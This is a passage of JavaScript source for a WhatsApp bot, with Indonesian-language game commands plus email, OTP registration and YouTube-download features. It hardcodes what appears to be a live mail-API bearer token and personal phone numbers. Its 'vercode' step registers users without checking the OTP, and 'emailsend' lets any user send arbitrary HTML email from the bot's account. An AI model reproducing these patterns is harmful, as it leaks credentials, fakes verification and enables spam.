  let failureMessage = `Sorry, your friend refuses to be corrupted, your friend complains and you are fined for *${uangnye}* Balance`
  let waitMessage = 'You have corrupted today, wait another hour and then commit corruption again.'
   if (new Date - global.db.data.users[m.sender].bansos < 3600000) return newReply(waitMessage)
  let target = m.mentionedJid[0]
  if (!target) return newReply(`*Example*: ${prefix}bansos @friend`)
let result = Math.random() >= 0.8
if (result) {
conn.sendMessage(m.chat, { image: { url: successImage }, caption: successMessage })
} else {
conn.sendMessage(m.chat, { image: { url: failureImage }, caption: failureMessage })
}
global.db.data.users[m.sender].bansos = new Date * 1
}
break
case 'tts': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
         	if (!text) return newReply(`Example : ${prefix + command} text`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
             conn.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mpeg', fileName: `${text}.mp3` }, { quoted: m })
         	}
         break
case 'say': {
 if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`${prefix + command} Zky Ganteng`)
newReply(`${text}`)
}
break
case 'makanan': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInvMakanan){ addInvMakanan(m.sender) }
if (!isBar){ addInvBar(m.sender, BarAwal) }
newReply(`── *MAKANAN* ──
🍡 Sate: ${getSate(m.sender)}
🍖 Steak: ${getSteak(m.sender)}
🍲 Sop Sapi: ${getSop(m.sender)}
🔥 Ikan Goreng: ${getGoreng(m.sender)}

≂ ʙᴀʀ ᴋᴇʟᴀᴘᴀʀᴀɴ ᴋᴀᴍᴜ ${getBar(m.sender)}`)
}
break
case 'cook': case 'masak': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isBar){ addInvBar(m.sender, BarAwal) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (args.length === 0) {
newReply(`──── *MEMASAK* ────\n
• Sate | Dibutuhkan Ayam 1
• Steak | Dibutuhkan Sapi 1
• Sop-Sapi | Dibutuhkan Ayam 1
• Ikan-Goreng | Dibutuhkan Ikan 5

*≂ ᴄᴀʀᴀ ᴍᴇᴍᴀsᴀᴋ ᴋᴇᴛɪᴋ .ᴄᴏᴏᴋ sᴀᴛᴇ, ᴀᴛᴀᴜ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ ʏᴀɴɢ ᴀᴅᴀ ᴅɪ ᴅᴀʟᴀᴍ ʟɪsᴛ*`)
} else if (args[0] === 'sate') {
if (isAyam < 1) return newReply(`Ayam Mu Tidak Cukup, Untuk Membuat Sate`)
newReply(`Membuat...`)
await sleep(1000)
addSate(m.sender, 10)
newReply(`Berhasil!!, Untuk Memakannya Ketik .makan sate`)
} else if (args[0] === 'sop-sapi') {
if (isSapi < 1) return newReply(`Sapi Mu Tidak Cukup, Untuk Membuat Sop`)
newReply(`Membuat..`)
await sleep(1000)
addSop(m.sender, 2)
newReply(`Berhasil!!, Untuk Memakannya Ketik .makan sop-sapi`)
} if (args[0] === 'steak') {
if (isSapi < 1) return newReply(`Sapi Mu Tidak Cukup, Untuk Membuat Steak`)
newReply(`Membuat..`)
await sleep(1000)
addSteak(m.sender, 2)
newReply(`Berhasil!!, Untuk Memakannya Ketik .makan steak`)
} else if (args[0] === 'ikan-goreng') {
if (isIkan < 5) return newReply(`Ikan Mu Tidak Cukup, Untuk Membuat Ikan Goreng`)
newReply(`Membuat..`)
await sleep(1000)
addGoreng(m.sender, 5)
newReply(`Berhasil!!, Untuk Memakannya Ketik .makan ikan-goreng`)
}
}
break
case 'makan': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInvMakanan){ addInvMakanan(m.sender) }
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isBar){ addInvBar(m.sender, BarAwal) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
if (args.length === 0) {
newReply(`──── *MAKANAN* ────
• Sate ${getSate(m.sender)}
• Steak: ${getSteak(m.sender)}
• Sop Sapi: ${getSop(m.sender)}
• Ikan Goreng: ${getGoreng(m.sender)}

*Pengunaan:* .makan ikan goreng
- List :
ikan goreng
sate
steak
sop sapi
`)
} if (args[0] === 'sate') {
if (isSate > 0) return newReply(`Kamu Harus Memasak Dulu`)
newReply(`Nyam Nyam Mms`)
await sleep(1000)
newReply(`Huhh Kenyangnya..
🌟 Bar Kamu Meningkat ! +50`)
addBar(m.sender, 50)
kurangSate(m.sender, 1)
} if (args[0] === 'steak') {
if (isSteak > 0) return newReply(`Kamu Harus Memasak Dulu`)
newReply(`Nyam Nyam Mms`)
await sleep(1000)
newReply(`Huhh Kenyangnya..
🌟 Bar Kamu Meningkat ! +100`)
addBar(m.sender, 100)
kurangSteak(m.sender, 1)
} if (args[0] === 'sop') {
if (args[1] === 'sapi') {
if (isSop > 0) return newReply(`Kamu Harus Memasak Dulu`)
newReply(`Nyam Nyam Mms`)
await sleep(1000)
newReply(`Huhh Kenyangnya..
🌟 Bar Kamu Meningkat ! +80`)
addBar(m.sender, 80)
kurangSop(m.sender, 1)
}
} if (args[0] == 'ikan') {
if (args[1] === 'goreng') {
if (isGoreng > 0) return newReply(`Kamu Harus Memasak Dulu`)
newReply(`Nyam Nyam Mms`)
await sleep(1000)
newReply(`Huhh Kenyangnya..
🌟 Bar Kamu Meningkat ! +80`)
addBar(m.sender, 80)
kurangGoreng(m.sender, 1)
}
}
}
break
case 'emailsend': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`*Example*: ${prefix}email gmaielehdh@com | halo zky`)
  let email = text.trim().split(/\s+\|\s+/).shift();
  let message = text.trim().split(/\s+\|\s+/).pop();
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: global.gmail,
      pass: global.pass,
    }
  });
  let mailOptions = {
    from: global.gmail,
    to: email,
    subject: global.subject,
    html: `
      <div style="border: 1px solid #ccc; padding: 20px; font-family: monospace;">
        <p style="font-size: 16px; margin-bottom: 20px;">${message}</p>
        <div style="text-align: center; font-family: monospace;">
          <hr style="display: inline-block; margin-top: 20px; margin-bottom: 20px; width: 60%;">
          <p style="font-size: 12px; display: inline-block;">2023 - 2025 ZkyOfc</p>
        </div>
      </div>
    `
  };
  try {
    await transporter.sendMail(mailOptions);
    m.reply('The email has been sent!');
  } catch (e) {
    console.log(e);
    m.reply('Failed to send email. Please try again later');
  }
}
break
case 'regmail': {
  async function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return emailRegex.test(email)
}

async function getLocationInfo() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) throw new Error(`Failed to fetch data. Status: ${response.status}`);
    const data = await response.json();
    return Object.values(data).join(', ');
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
async function sendEmail(botName, ownName, botNumber, ownNumber, Name, Msg, OTP, Number, PP, Mail) {
let html = `<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>${botName} - otp-email;</title>
  

</head>
<body>
<!-- partial:index.partial.html -->
<!doctype html>
    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
      <head>
        <title>
          Confirm your email address
        </title>
        <!--[if !mso]><!-->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <!--<![endif]-->
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style type="text/css">
          #outlook a { padding:0; }
          body { margin:0;padding:0;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%; }
          table, td { border-collapse:collapse;mso-table-lspace:0pt;mso-table-rspace:0pt; }
          img { border:0;height:auto;line-height:100%; outline:none;text-decoration:none;-ms-interpolation-mode:bicubic; }
          p { display:block;margin:13px 0; }
        </style>
        <!--[if mso]>
        <noscript>
        <xml>
        <o:OfficeDocumentSettings>
          <o:AllowPNG/>
          <o:PixelsPerInch>96</o:PixelsPerInch>
        </o:OfficeDocumentSettings>
        </xml>
        </noscript>
        <![endif]-->
        <!--[if lte mso 11]>
        <style type="text/css">
          .mj-outlook-group-fix { width:100% !important; }
        </style>
        <![endif]-->
        
        
    <style type="text/css">
      @media only screen and (min-width:480px) {
        .mj-column-per-100 { width:100% !important; max-width: 100%; }
      }
    </style>
    <style media="screen and (min-width:480px)">
      .moz-text-html .mj-column-per-100 { width:100% !important; max-width: 100%; }
    </style>
    
  
        <style type="text/css">
        
        

    @media only screen and (max-width:480px) {
      table.mj-full-width-mobile { width: 100% !important; }
      td.mj-full-width-mobile { width: auto !important; }
    }
  
        </style>
        <style type="text/css">@import url('https://fonts.googleapis.com/css?family=Poppins:300,400,700');.card {
      box-shadow: 0 1px 12px 0 rgba(0, 0, 0, 0.08);
      }

      .text-link {
      color: #0f72ee;
      }

      .link {
      color: #0f72ee;
      }


      .token-ele {
      width: 225px;
      font-size: 36px;
      letter-spacing: 14px;
      }

      .button > table {
      width: 275px;
      }

      @media (max-width: 425px) {
      .token-ele {
      font-size: 24px;
      letter-spacing: 8px;
      width: 200px;
      text-align: left;
      }

      .button > table {
      width: 200px;
      }
      }.footer-link {
        color: #0f72ee;
      }</style>
        
      </head>
      <body style="word-spacing:normal;background-color:#f7f9fb
;">
        
    <div style="display:none;font-size:1px;color:#ffffff;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
      Confirm your email address using this OTP
    </div>
  
        
      <div style="background-color:#f7f9fb
;">
        <!-- this ensures Gmail doesn't trim the email --><span style="opacity: 0"> ${Msg} </span>
      <div class="mj-column-per-100 mj-outlook-group-fix" style="font-size:0px;text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:100%;">
        
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="vertical-align:top;" width="100%">
        <tbody>
          
              <tr>
                <td align="center" style="font-size:0px;padding:10px 25px;padding-top:48px;word-break:break-word;">
                  
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-collapse:collapse;border-spacing:0px;">
        <tbody>
          <tr>
            <td style="width:122px;">
              
      <img style="width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 10px; background-color: #e5e5e5; background-image: url('${PP}'); background-size: cover; background-position: center;"/>
    
            </td>
          </tr>
        </tbody>
      </table>
    
                </td>
              </tr>
            
        </tbody>
      </table>
    
      </div>
    
      
      <!--[if mso | IE]><table align="center" border="0" cellpadding="0" cellspacing="0" class="" style="width:588px;" width="588" ><tr><td style="line-height:0px;font-size:0px;mso-line-height-rule:exactly;"><![endif]-->
    
      
      <div style="margin:0px auto;max-width:588px;">
        
        <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:100%;">
          <tbody>
            <tr>
              <td style="direction:ltr;font-size:0px;padding:20px 0;padding-bottom:0px;padding-top:48px;text-align:center;">
                <!--[if mso | IE]><table role="presentation" border="0" cellpadding="0" cellspacing="0"><tr><td class="card-outlook" width="588px" ><table align="center" border="0" cellpadding="0" cellspacing="0" class="card-outlook" style="width:588px;" width="588" bgcolor="#ffffff" ><tr><td style="line-height:0px;font-size:0px;mso-line-height-rule:exactly;"><![endif]-->
    
      
      <div class="card" style="background:#ffffff;background-color:#ffffff;margin:0px auto;max-width:588px;">
        
        <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="background:#ffffff;background-color:#ffffff;width:100%;">
          <tbody>
            <tr>
              <td style="border-top:5px solid #0f72ee;direction:ltr;font-size:0px;padding:20px 0;padding-bottom:48px;padding-left:15px;padding-right:15px;padding-top:40px;text-align:center;">
                <!--[if mso | IE]><table role="presentation" border="0" cellpadding="0" cellspacing="0"><tr><td class="" style="vertical-align:top;width:558px;" ><![endif]-->
            
      <div class="mj-column-per-100 mj-outlook-group-fix" style="font-size:0px;text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:100%;">
        
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="vertical-align:top;" width="100%">
        <tbody>
          
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:0px;padding-bottom:0px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:400;line-height:24px;text-align:left;color:#2b292d;"><h1 style="margin-bottom: 16px; line-height: 36px; margin-bottom: 0px; ">Activate your account</h1></div>
    
                </td>
              </tr>
            
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:12px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:normal;line-height:24px;text-align:left;color:#616161;">Please use the OTP below to access ${botName}.</div>
    
                </td>
              </tr>
            
              <tr>
                <td align="left" class="token" style="font-size:0px;padding:10px 25px;padding-top:24px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:36px;font-weight:bold;letter-spacing:14px;line-height:24px;text-align:left;color:#2b292d;" id="token"><mj-raw>
              <div class="token-ele" style=" background-color: #e0e6ef; padding-top: 20px; padding-bottom: 20px; padding-left: 24px;  padding-right: 24px;   border-radius: 4px;" id="token">
                ${OTP}
              </div>
            </mj-raw></div>
    
                </td>
              </tr>
            
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:12px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:normal;line-height:24px;text-align:left;color:#616161;">Alternatively, click the button below to verify your login.</div>
    
                </td>
              </tr>
            
              <tr>
                <td align="left" vertical-align="middle" class="button" style="font-size:0px;padding:10px 25px;word-break:break-word;">
                  
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-collapse:separate;line-height:100%;">
        <tbody>
          <tr>
            <td align="center" bgcolor="#0f72ee" role="presentation" style="border:none;border-radius:3px;cursor:auto;height:42px;mso-padding-alt:10px 25px;background:#0f72ee;" valign="middle">
              <a href="https://wa.me/${Number}?text=.vercode ${OTP}" style="display:inline-block;background:#0f72ee;color:white;font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:normal;line-height:120%;margin:0;text-decoration:none;text-transform:none;padding:10px 25px;mso-padding-alt:0px;border-radius:3px;" target="_blank">
                Verify account login
              </a>
            </td>
          </tr>
        </tbody>
      </table>
    
                </td>
              </tr>
            
              <tr>
                <td align="center" style="font-size:0px;padding:10px 25px;padding-top:24px;word-break:break-word;">
                  
      <p style="border-top:dashed 1px #e4ebf6;font-size:1px;margin:0px auto;width:100%;">
      </p>
      
      <!--[if mso | IE]><table align="center" border="0" cellpadding="0" cellspacing="0" style="border-top:dashed 1px #e4ebf6;font-size:1px;margin:0px auto;width:508px;" role="presentation" width="508px" ><tr><td style="height:0;line-height:0;"> &nbsp;
</td></tr></table><![endif]-->
    
    
                </td>
              </tr>
            
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:24px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:normal;line-height:24px;text-align:left;color:#616161;">If “Verify Account login” Button is not working, copy and paste this link in your
            browser to verify <a href="https://wa.me/${Number}?text=.vercode ${OTP}" target="_blank" class="link" rel="noreferrer">Click Me!!</a></div>
    
                </td>
              </tr>
            
              <tr>
                <td align="center" style="font-size:0px;padding:10px 25px;padding-top:24px;word-break:break-word;">
                  
      <p style="border-top:dashed 1px #e4ebf6;font-size:1px;margin:0px auto;width:100%;">
      </p>
      
      <!--[if mso | IE]><table align="center" border="0" cellpadding="0" cellspacing="0" style="border-top:dashed 1px #e4ebf6;font-size:1px;margin:0px auto;width:508px;" role="presentation" width="508px" ><tr><td style="height:0;line-height:0;"> &nbsp;
</td></tr></table><![endif]-->
    
    
                </td>
              </tr>
            
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:48px;padding-bottom:8px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:16px;font-weight:700;line-height:24px;text-align:left;color:#000000;">Need Help?</div>
    
                </td>
              </tr>
            
              <tr>
                <td align="left" style="font-size:0px;padding:10px 25px;padding-top:4px;padding-bottom:0px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:14px;font-weight:normal;line-height:24px;text-align:left;color:#616161;">Please send a feedback or bug info
            to <a href="https://wa.me/${ownNumber}?text=feedback" class="link"> ${ownName} </a></div>
    
                </td>
              </tr>
            
        </tbody>
      </table>
    
      </div>
    
          <!--[if mso | IE]></td></tr></table><![endif]-->
              </td>
            </tr>
          </tbody>
        </table>
        
      </div>
    
      
      <!--[if mso | IE]></td></tr></table></td></tr></table><![endif]-->
              </td>
            </tr>
          </tbody>
        </table>
        
      </div>
    
      
      <!--[if mso | IE]></td></tr></table><![endif]-->
    
    
      <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:100%;">
        <tbody>
          <tr>
            <td>
              
        
      <!--[if mso | IE]><table align="center" border="0" cellpadding="0" cellspacing="0" class="" style="width:588px;" width="588" ><tr><td style="line-height:0px;font-size:0px;mso-line-height-rule:exactly;"><![endif]-->
    
        
      <div style="margin:0px auto;max-width:588px;">
        
        <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:100%;">
          <tbody>
            <tr>
              <td style="direction:ltr;font-size:0px;padding:20px 0;padding-bottom:0px;padding-top:0px;text-align:center;">
                <!--[if mso | IE]><table role="presentation" border="0" cellpadding="0" cellspacing="0"><tr><td class="" width="588px" ><table align="center" border="0" cellpadding="0" cellspacing="0" class="" style="width:588px;" width="588" ><tr><td style="line-height:0px;font-size:0px;mso-line-height-rule:exactly;"><![endif]-->
    
      
      <div style="margin:0px auto;max-width:588px;">
        
        <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:100%;">
          <tbody>
            <tr>
              <td style="direction:ltr;font-size:0px;padding:20px 0;text-align:center;">
                <!--[if mso | IE]><table role="presentation" border="0" cellpadding="0" cellspacing="0"><tr><td class="" style="vertical-align:top;width:588px;" ><![endif]-->
            
      <div class="mj-column-per-100 mj-outlook-group-fix" style="font-size:0px;text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:100%;">
        
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%">
        <tbody>
          <tr>
            <td style="vertical-align:top;padding:0;">
              
      <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="" width="100%">
        <tbody>
          
              <tr>
                <td align="center" style="font-size:0px;padding:10px 25px;word-break:break-word;">
                  
      <div style="font-family:'Poppins', 'Helvetica Neue', Helvetica, Arial, sans-serif;font-size:11px;font-weight:400;line-height:24px;text-align:center;color:#445566;">${await getLocationInfo()}
            <br/>
            Thanks!
            <br/></div>
    
                </td>
              </tr>
            
        </tbody>
      </table>
    
            </td>
          </tr>
        </tbody>
      </table>
    
      </div>
    
          <!--[if mso | IE]></td></tr></table><![endif]-->
              </td>
            </tr>
          </tbody>
        </table>
        
      </div>
    
      
      <!--[if mso | IE]></td></tr></table></td></tr></table><![endif]-->
              </td>
            </tr>
          </tbody>
        </table>
        
      </div>
    
        
      <!--[if mso | IE]></td></tr></table><![endif]-->
    
      
            </td>
          </tr>
        </tbody>
      </table>
    <!-- this ensures Gmail doesn't trim the email --><span style="opacity: 0"> ${Msg} </span>
      </div>
    
      </body>
    </html>
<!-- partial -->
  
</body>
</html>
`
    try {
        return await fetch("https://send.api.mailtrap.io/api/send/", {
                method: "POST",
                headers: {
                    "Authorization": "Bearer 46fae2154055e6df3901c95919531b2a",
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    "from": {
                        "email": "notifier@boyne.dev",
                        "name": "cs.zanishi"
                    },
                    "to": [{
                        "email": Mail,
                        "name": "cs.zanishi"
                    }],
                    "subject": "Verify Your Account",
                    "html": html,
                    "category": "Notification"
                })
            })
            .then(response => response.json())
    } catch (error) {
        console.error("Request failed:", error)
        throw error
    }
}
async function shortUrl(url) {
    let res = await fetch(`https://tinyurl.com/api-create.php?url=${url}`)
    return await res.text()
}

  if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D');

  let generateOTP = (Math.floor(Math.random() * 9000) + 1000).toString()
  let email = text;
  if (isRegistered) return newReply(`You are already registered. Want to register again? .unreg 90259a21exxxxxx`);
  
  let verificationCode = generateOTP
  if (!email) return newReply(`Use ${command} <emailyou>`);
let avatar = await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/a2ae6cbfa40f6eeea0cf1.jpg')
let nameown = `Arybotz`
let nomorown = `6285762008398`
let nomorbot = `212718041263`

    let res = await sendEmail(namabot, nameown, nomorown, nomorbot, pushname, 'Arybotz', verificationCode, m.sender.split('@')[0], avatar, email)
if (res.success == true) return reply(`Check your email! Verification code has been sent.`)
}
break;
case 'vercode': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let generateOTP = (Math.floor(Math.random() * 9000) + 1000).toString()
if (isRegistered) return newReply(`You are already registered
Want to register again? .unreg 90259a21exxxxxx`)
let verificationCode = parseInt(text.trim());
let verificationCode1 = generateOTP
let ver = Math.floor(1000 + Math.random() * 9000);
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
if (args.length == 0) return newReply(`Masukan Code Yang Terkirim Di Email Kamu!!`)

let umur = 'private 🔒'
addRegisteredUser(m.sender, pushname, umur, sn)
newReply(`Register *Successfull* Thank you ${pushname} Check your name and age on *.me*. If the name doesn't match, please type *.rename*`)
}
break
case 'home': case 'rumah': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
if (getRumah > 0) return newReply(`Kamu Tidak Punya Rumah`)
let input = args[0]
newReply(`乂 *🏘️ H O M E*
ini adalah rumah kamu, kamu bisa tidur atau melakukan sesuatu lainnya.

╭  ◦ .rumah --tidur < untuk tidur >
│  ◦ .rumah --minum < meningkatkan bar >
╰  ◦ .rumah --makan < meningkatkan bar >`)
if (!input) return reply(`Masukan Command Yang Ada Pada Sistem Rumah`)
if (input === '--tidur') {
if (isBar === 100) return reply(`Tidak Bisa Tidur.!`)
let tidur = `乂 *S L E E P - R E S U L T*
╭
│ Bar & Darah Meningkat! 
╰`
let { key } = await conn.sendMessage(m.chat, { text: '☀️' }, { quoted: m })
await sleep(900)
conn.sendMessage(m.chat, { text: `🌜`, edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: `💤`, edit: key }, { quoted: fkontak })
await sleep(980)
conn.sendMessage(m.chat, { text: `☀️`, edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: `Dah Siang Bangun !!!`, edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: tidur, edit: key }, { quoted: fkontak })
addBar(m.sender, 70)
} else if (input === '--makan') {
if (isBar === 100) return reply(`Tidak Bisa Makan, Karna Kamu Sudah Kenyang.`)
let makan = `乂 *E A T - R E S U L T*
╭
│ Bar Kamu Meningkat!
╰`
let { key } = await conn.sendMessage(m.chat, { text: '🍱️' }, { quoted: m })
await sleep(1000)
conn.sendMessage(m.chat, { text: makan, edit: key }, { quoted: fkontak })
addBar(m.sender, 90)
} else if (input === '--minum') {
if (isBar === 100) return reply(`Tidak Bisa Minum!`)
let minum = `乂 *M I N U M - R E S U L T*
╭
│ Bar Kamu Meningkat!
╰`
let { key } = await conn.sendMessage(m.chat, { text: '🍶️' }, { quoted: m })
await sleep(1000)
conn.sendMessage(m.chat, { text: minum, edit: key }, { quoted: fkontak })
addBar(m.sender, 90)
}
}
break
case 'ytmp3': case 'ytaudio': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
if (!text.includes('youtu.be') && !text.includes('youtube.com')) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
await newReply(mess.wait)
let search = await yts(`${text}`)
let tt = `*YOUTUBE PLAY*

ID : ${search.all[0].videoId}
Title : ${search.all[0].title}
Views : ${search.all[0].views}
Duration : ${search.all[0].timestamp}
Channel : ${search.all[0].author.name}
Upload : ${search.all[0].ago}
URL Video : ${search.videos[0].url}
Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
conn.sendMessage(m.chat, {image: todd, caption: tt}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
conn.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg' }, {quoted: m})
   })
}
break
case 'play': case 'ytplay':{
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Example : ${prefix + command} Top Homok`)
const youtube = require("yt-search");
try {
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) throw 'Video/Audio Tidak Ditemukan';
if (convert.seconds >= 3600) {
return newReply('Video is longer than 1 hour!') 
} else {
var audioUrl
try {
audioUrl = `https://aemt.me/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
} catch (e) {
audioUrl = `https://aemt.me/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`} 
var ss = `乂 *Y O U T U B E  P L A Y*

    ◦ *Title* : ${convert.title}
    ◦  *Duration* : ${convert.timestamp}
    ◦  *Channel* : ${convert.author.url}
    ◦  *Url* : ${convert.url}
    ◦  *Description* : ${convert.description}

*${global.wm}*`;
let old = new Date()
var pesan = conn.relayMessage(m.chat, {
extendedTextMessage:{
text: ss, 
contextInfo: {
externalAdReply: {
title: global.namabot,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: convert.image,
sourceUrl: sig
}
}, mentions: [m.sender]
}}, {})
conn.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `Fetching : ${((new Date - old) * 1)} ms`,
body: "",
thumbnailUrl: convert.image,
sourceUrl: sig,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
}
} catch (e) {
newReply(`*Terjadi Kesalahan: *` + e);
}
}
break
case 'ytaudio2': case 'play2': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Example : ${prefix + command} Lagu sad`)
const youtube = require("yt-search");
try {
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) throw 'Video/Audio Tidak Ditemukan';
if (convert.seconds >= 3600) {
return newReply('Video is longer than 1 hour!') 
} else {
var audioUrl
try {
audioUrl = `https://aemt.me/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
} catch (e) {
audioUrl = `https://aemt.me/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`} 
var kk = `乂 *Y O U T U B E  P L A Y*

    ◦ *Title* : ${convert.title}
    ◦  *Duration* : ${convert.timestamp}
    ◦  *Channel* : ${convert.author.url}
    ◦  *Url* : ${convert.url}
    ◦  *Description* : ${convert.description}

*${global.wm}*`;
let old = new Date()
var pesan = conn.relayMessage(m.chat, {
extendedTextMessage:{
text: kk, 
contextInfo: {
externalAdReply: {
title: global.namabot,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: convert.image,
sourceUrl: sig
}
}, mentions: [m.sender]
}}, {})
conn.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `🍄 Fetching : ${((new Date - old) * 1)} ms`,
body: "",
thumbnailUrl: convert.image,
sourceUrl: sig,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
}
} catch (e) {
newReply(`*Error*`);
}
}
break


case 'noftication': case 'nf': {
if (!isCreator) return newReply(`No Access Denied`)
if (!text) return newReply(`masukan Query`)
let caption = `*NOFITICATION*

${text}`
conn.sendMessage(`${global.id}`, { text: caption })
reply(`Berhasil Mengirim Nofitication / Pemberitahuan`)
}
break
case 'ban': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (args.length === 0) return reply(`Ex: <tag>|<alasan>`)
let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : args.split('|')[0] + '@s.whatsapp.net'
    else who = args.split('|')[0] + '@s.whatsapp.net'
